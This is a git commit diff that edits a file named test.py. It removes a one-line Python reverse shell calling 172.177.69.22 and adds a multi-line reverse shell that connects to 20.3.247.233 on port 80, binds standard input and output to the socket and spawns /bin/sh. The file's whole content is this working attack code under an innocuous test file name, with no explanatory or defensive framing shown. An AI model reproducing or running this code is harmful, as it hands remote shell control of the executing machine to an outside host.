b19061b50afd7799b42401a9332fc64f9e58be84
Raunak <54508518+TROUBLE-1@users.noreply.github.com>
2025-04-08 15:43:45 +0530

    Update test.py

--- test.py
+++ test.py
@@ -1,1 +1,13 @@
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.177.69.22",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
+import socket,os,pty
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+s.connect(("20.3.247.233",80))
+
+os.dup2(s.fileno(),0)
+
+os.dup2(s.fileno(),1)
+
+os.dup2(s.fileno(),2)
+
+pty.spawn("/bin/sh")
